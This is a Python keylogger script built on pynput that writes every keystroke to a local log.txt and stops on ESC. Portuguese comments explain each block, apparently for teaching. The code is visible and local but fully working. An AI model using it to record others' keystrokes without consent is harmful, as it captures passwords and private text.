import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Tecla alfanumérica {0} pressionada'.format(key.char))
    except AttributeError:
        print('Tecla especial {0} pressionada'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')

def on_release(key):
    print('{0} liberada'.format(key))
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

#Explicação do código por blocos:

#Importação das bibliotecas necessárias:
#'pynput' é a biblioteca principal que permite monitorar e interagir com o teclado.
#'key' e 'listener' são classes específicas da biblioteca pynput utilizadas para configurar o monitoramento do teclado.

#----
    
#Inicialização de Variáveis:
#keys = []
    
#Aqui, é criada uma lista vazia chamada keys, usada para armazenar as teclas pressionadas.

#----

#Função on_press(key):
#def on_press(key) até  print('Tecla especial {0} pressionada'.format(key))

#Esta função é chamada quando uma tecla é pressionada. Dentro dela:
#A tecla pressionada é adicionada à lista keys.
#A função 'write_file' é chamada para escrever a tecla no arquivo de log.
#Ela tenta imprimir o caractere associado à tecla pressionada, se for uma tecla alfanumérica, ou a descrição da tecla especial.

#----

#Função write_file(keys):
#write_file(keys) até f.write(' ')

#A função write_file é responsável por escrever as teclas pressionadas em um arquivo de log chamado "log.txt". Ela:
#Abre o arquivo "log.txt" em modo de escrita ('w').
#Itera sobre a lista keys, converte cada tecla para uma string e escreve no arquivo, removendo as aspas simples (') se presentes, seguido de um espaço.

#----
    
#Função on_release(key):
#on_release(key) até return False

#A função on_release é chamada quando uma tecla é liberada. Ela:
#Imprime a tecla que foi liberada.
#Verifica se a tecla liberada é a tecla "ESC" (Escape). Se for, a função retorna False, encerrando o monitoramento do teclado e encerrando o programa.

#----

#Inicialização do Listener:
#Neste bloco, o listener (monitor) do teclado é iniciado usando a classe Listener da biblioteca pynput.
#As funções on_press e on_release são configuradas como callbacks (pois são passadas como argumentos para a função Listener)
    #para monitorar as teclas pressionadas e liberadas.


#O programa continuará sendo executado e monitorando as teclas até que a tecla "ESC" seja pressionada,
    #momento em que o programa se encerrará e o arquivo de log "log.txt" conterá as teclas pressionadas durante a execução.
